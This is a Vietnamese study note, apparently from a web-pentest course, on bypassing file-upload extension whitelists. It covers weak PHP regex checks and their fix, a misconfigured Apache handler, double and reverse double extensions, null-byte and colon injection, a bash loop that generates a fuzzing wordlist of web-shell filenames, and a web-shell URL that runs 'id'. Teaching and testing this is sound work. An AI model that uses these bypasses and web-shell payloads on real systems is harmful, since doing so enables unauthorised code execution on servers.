# Whitelist Filters

## Giới thiệu
- Có 2 cách validate file extension:
  - **Blacklist**: chặn các extension nguy hiểm
  - **Whitelist**: chỉ cho phép extension cụ thể (an toàn hơn)

- Use case:
  - Blacklist → khi cần cho phép nhiều loại file (VD: file manager)
  - Whitelist → khi chỉ cho phép ít loại file (VD: upload ảnh)

---

## Whitelisting Extensions

- Khi upload file:
  - Thử upload `.phtml` → bị chặn
  - Thông báo: **"Only images are allowed"**

⚠️ Lưu ý:
- Error message không phản ánh chính xác cơ chế validate
- Cần **fuzz extension** để tìm whitelist thực sự

---

## Regex kiểm tra whitelist (lỗi phổ biến)

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

❌ Lỗi:
- Chỉ kiểm tra **có chứa extension**
- Không kiểm tra **extension ở cuối**

---

## Double Extensions

### Ý tưởng
- Thêm extension hợp lệ vào giữa filename

### Ví dụ
```
shell.jpg.php
```

→ Pass whitelist vì có `.jpg`  
→ Nhưng vẫn thực thi PHP

### Kết quả
- Upload thành công
- Execute command:

```
http://SERVER/profile_images/shell.jpg.php?cmd=id
```

---

## Regex chặt hơn

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
```

✔️ Fix:
- `$` → đảm bảo extension nằm **cuối**

→ Double extension **không còn hiệu quả**

---

## Reverse Double Extension

### Nguyên nhân
- Lỗi config web server (Apache)

```apache
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

❌ Lỗi:
- Không có `$`
- Chỉ cần **chứa `.php`** là execute

---

### Exploit

```
shell.php.jpg
```

- Pass whitelist (đuôi `.jpg`)
- Server vẫn execute PHP (do chứa `.php`)

✔️ Bypass thành công

---

## Character Injection

### Ý tưởng
- Chèn ký tự để bypass validate

### Các ký tự thường dùng
```
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

---

### Ví dụ

#### Null byte (PHP < 5.x)
```
shell.php%00.jpg
```

→ Server lưu thành `shell.php`

---

#### Windows trick
```
shell.aspx:.jpg
```

→ Lưu thành `shell.aspx`

---

## Fuzzing với wordlist custom

### Script tạo payload

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
  for ext in '.php' '.phps'; do
    echo "shell$char$ext.jpg" >> wordlist.txt
    echo "shell$ext$char.jpg" >> wordlist.txt
    echo "shell.jpg$char$ext" >> wordlist.txt
    echo "shell.jpg$ext$char" >> wordlist.txt
  done
done
```

---

### Mục tiêu
- Fuzz bằng **Burp Intruder**
- Tìm:
  - Filename upload được
  - Filename execute được

---

## Tổng kết bypass whitelist

| Technique | Điều kiện |
|----------|---------|
| Double extension | Regex yếu |
| Reverse double extension | Server misconfig |
| Character injection | Server/app lỗi hoặc cũ |
| Fuzzing | Tìm bypass thực tế |

---
